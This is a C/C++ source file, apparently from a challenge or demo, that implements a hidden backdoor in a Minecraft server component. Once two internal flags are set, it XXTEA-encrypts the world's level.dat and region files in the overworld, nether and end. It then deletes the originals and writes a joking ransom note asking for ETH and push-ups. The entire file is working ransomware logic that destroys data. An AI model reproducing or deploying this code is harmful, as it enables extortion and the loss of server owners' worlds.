#include "crypt.h"
#include "backdoor.h"

#include <unistd.h>
#include <dirent.h>
#include <cstdlib>
#include <cstring>
#include <cstdio>

char key[17] = {0};

bool backdoor1 = false;
bool backdoor2 = false;

// For rounding up to the nearest multiple of 4
#define ROUND_UP(x) ((x) & 0x03 ? (x) + 4 - ((x) & 0x03) : (x))

extern "C" {

__attribute__((visibility("hidden"))) bool encrypt_level_dat(char* level_dat_path) {
    // encrypt level.dat
    FILE *level_dat = fopen(level_dat_path, "rb");
    if (!level_dat) {
        #if DEBUG
        printf("[DEBUG] could not open level.dat at %s\n", level_dat_path);
        #endif
        return false;
    }

    fseek(level_dat, 0, SEEK_END);
    size_t level_dat_size = ftell(level_dat);
    fseek(level_dat, 0, SEEK_SET);
    size_t padded_length = ROUND_UP(level_dat_size);
    if (padded_length < 8) {
        // we need at least 2 blocks for xxtea
        padded_length = 8;
    }

    #if DEBUG
    printf("[DEBUG] level.dat at %s is %lu bytes\n", level_dat_path, level_dat_size);
    printf("[DEBUG] padded length: %lu\n", padded_length);
    #endif

    unsigned char *level_dat_data = (unsigned char *)malloc(padded_length);
    fread(level_dat_data, 1, level_dat_size, level_dat);
    fclose(level_dat);

    encrypt(level_dat_data, padded_length, (unsigned char *)key);
    // write to level.dat.enc
    char *level_dat_enc_path = (char *)malloc(strlen(level_dat_path) + 16);
    snprintf(level_dat_enc_path, strlen(level_dat_path) + 8, "%s.enc", level_dat_path);

    FILE *level_dat_enc = fopen(level_dat_enc_path, "wb");
    if (!level_dat_enc) {
        #if DEBUG
        printf("[DEBUG] could not open level.dat.enc at %s\n", level_dat_enc_path);
        #endif
        return false;
    }

    #if DEBUG
    printf("[DEBUG] writing encrypted level.dat (%lu bytes) to %s\n", padded_length, level_dat_enc_path);
    #endif

    size_t bytes_written = fwrite(level_dat_data, 1, padded_length, level_dat_enc);
    fclose(level_dat_enc);

    free(level_dat_data);
    free(level_dat_enc_path);

    // delete level.dat
    remove(level_dat_path);

    return true;
}

__attribute__((visibility("hidden"))) bool encrypt_region_files(char* region_dir_path) {
    // check that dir exists
    DIR *region_dir = opendir(region_dir_path);
    if (!region_dir) {
        #if DEBUG
        printf("[DEBUG] could not open region directory at %s\n", region_dir_path);
        #endif
        return false;
    }

    #if DEBUG
    int count = 0;
    #endif

    struct dirent *entry;
    while ((entry = readdir(region_dir)) != NULL) {
        // skip non-regular files
        if (entry->d_type != DT_REG) {
            continue;
        }

        // ignore files that don't end with .mca
        if (strlen(entry->d_name) < 4 || strcmp(entry->d_name + strlen(entry->d_name) - 4, ".mca") != 0) {
            continue;
        }

        char region_file_path[512];
        snprintf(region_file_path, sizeof(region_file_path), "%s%s", region_dir_path, entry->d_name);
        FILE *region_file = fopen(region_file_path, "rb");
        if (!region_file) {
            #if DEBUG
            printf("[DEBUG] could not open region file at %s\n", region_file_path);
            #endif
            continue;
        }

        fseek(region_file, 0, SEEK_END);
        size_t region_file_size = ftell(region_file);
        fseek(region_file, 0, SEEK_SET);
        size_t padded_length = ROUND_UP(region_file_size);
        if (padded_length < 8) {
            // we need at least 2 blocks for xxtea
            padded_length = 8;
        }

        unsigned char *region_file_data = (unsigned char *)malloc(padded_length);
        fread(region_file_data, 1, region_file_size, region_file);
        fclose(region_file);

        encrypt(region_file_data, padded_length, (unsigned char *)key);
        // write to region_file.enc
        char *region_file_enc_path = (char *)malloc(strlen(region_file_path) + 16);
        snprintf(region_file_enc_path, strlen(region_file_path) + 8, "%s.enc", region_file_path);

        FILE *region_file_enc = fopen(region_file_enc_path, "wb");
        if (!region_file_enc) {
            #if DEBUG
            printf("[DEBUG] could not open region file.enc at %s\n", region_file_enc_path);
            #endif
            free(region_file_data);
            free(region_file_enc_path);
            continue;
        }

        size_t bytes_written = fwrite(region_file_data, 1, padded_length, region_file_enc);
        fclose(region_file_enc);

        free(region_file_data);
        free(region_file_enc_path);

        // delete region file
        remove(region_file_path);

        #if DEBUG
        count++;
        #endif
    }

    #if DEBUG
    printf("[DEBUG] encrypted %d region files\n", count);
    #endif

    closedir(region_dir);
    return true;
}

void backdoor_func() {
    // both backdoors must be active
    if (!backdoor1 || !backdoor2) {
        return;
    }
    
    char path[256];
    if (!getcwd(path, sizeof(path))) {
        return;
    }

    #if DEBUG
    printf("[DEBUG] in backdoor_func\n");
    // get current directory
    printf("[DEBUG] current directory: %s\n", path);
    #endif

    // look for world
    char to_encrypt_path[512];
    snprintf(to_encrypt_path, sizeof(to_encrypt_path), "%s/world/level.dat", path);
    if (access(to_encrypt_path, F_OK) != 0){
        return;
    }
    if (!encrypt_level_dat(to_encrypt_path)) {
        return;
    }

    // encrypt region files
    snprintf(to_encrypt_path, sizeof(to_encrypt_path), "%s/world/region/", path);
    if (!encrypt_region_files(to_encrypt_path)) {
        return;
    }

    // look for world_nether
    snprintf(to_encrypt_path, sizeof(to_encrypt_path), "%s/world_nether/level.dat", path);
    if (access(to_encrypt_path, F_OK) != 0){
        return;
    }
    if (!encrypt_level_dat(to_encrypt_path)) {
        return;
    }

    // encrypt region files
    snprintf(to_encrypt_path, sizeof(to_encrypt_path), "%s/world_nether/DIM-1/region/", path);
    if (!encrypt_region_files(to_encrypt_path)) {
        return;
    }

    // look for world_the_end
    snprintf(to_encrypt_path, sizeof(to_encrypt_path), "%s/world_the_end/level.dat", path);
    if (access(to_encrypt_path, F_OK) != 0){
        return;
    }
    if (!encrypt_level_dat(to_encrypt_path)) {
        return;
    }

    // encrypt region files
    snprintf(to_encrypt_path, sizeof(to_encrypt_path), "%s/world_the_end/DIM1/region/", path);
    if (!encrypt_region_files(to_encrypt_path)) {
        return;
    }

    #if DEBUG
    printf("[DEBUG] all level.dat files found and encrypted\n");
    #endif

    // write ransom note
    char *ransom_note_path = (char *)malloc(strlen(path) + 24);
    snprintf(ransom_note_path, strlen(path) + 23, "%s/RANSOM_NOTE.txt", path);
    FILE *ransom_note = fopen(ransom_note_path, "w");
    if (!ransom_note) {
        #if DEBUG
        printf("[DEBUG] could not open ransom note at %s\n", ransom_note_path);
        #endif
        return;
    }

    #if DEBUG
    printf("[DEBUG] writing ransom note to %s\n", ransom_note_path);
    #endif

    fprintf(ransom_note, "Your world has been encrypted. To get it back, please do the following:\n");
    fprintf(ransom_note, "1. Send 500,000 ETH to the following address: 0x1234567890abcdef\n");
    fprintf(ransom_note, "2. Do 5,000 push-ups on camera and upload it to YouTube\n");
    fprintf(ransom_note, "3. Wait for further instructions\n");
    fprintf(ransom_note, "4. Keep waiting for further instructions\n");
    fprintf(ransom_note, "If you do not comply within 48 hours, your world will be deleted.\n");
}
}